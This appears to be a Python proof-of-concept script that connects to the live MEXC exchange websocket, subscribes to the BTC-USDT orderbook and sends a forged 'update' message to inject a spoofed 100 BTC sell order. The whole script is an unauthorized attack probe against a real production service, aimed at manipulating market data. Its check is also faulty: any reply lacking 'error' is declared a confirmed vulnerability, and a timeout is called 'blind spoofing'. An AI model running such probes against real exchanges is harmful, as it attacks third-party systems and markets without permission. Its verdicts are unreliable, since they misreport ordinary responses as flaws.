import asyncio
import websockets
import json

async def verify_orderbook_vulnerability():
    """Standalone test for MEXC orderbook spoofing"""
    try:
        print("🟢 Step 1: Connecting to wss://wbs.mexc.com/ws...")
        async with websockets.connect("wss://wbs.mexc.com/ws") as ws:
            
            # Step 2: Authentic subscription
            await ws.send(json.dumps({
                "op": "subscribe",
                "args": ["orderbook:BTC-USDT"]
            }))
            print("🟢 Step 2: Subscribed to orderbook")
            
            # Step 3: Wait for confirmation
            response = await ws.recv()
            print(f"🔵 Step 3: Server response: {response}")
            
            # Step 4: Inject spoofed order
            spoofed_data = {
                "op": "update",
                "args": [{
                    "symbol": "BTC-USDT",
                    "price": "80000.00",  # Clearly unrealistic price
                    "quantity": "100",
                    "side": "sell"
                }]
            }
            await ws.send(json.dumps(spoofed_data))
            print("🟡 Step 4: Injected spoofed order (BTC 100@$80K)")
            
            # Step 5: Verify impact
            try:
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                if "error" not in response.lower():
                    print("🔴 Step 5: VULNERABILITY CONFIRMED - Order accepted")
                else:
                    print("🟢 Step 5: Server rejected (secure)")
            except asyncio.TimeoutError:
                print("🟠 Step 5: Check MEXC UI manually - potential blind spoofing")
                
    except Exception as e:
        print(f"🔴 Critical error: {str(e)}")

asyncio.run(verify_orderbook_vulnerability())
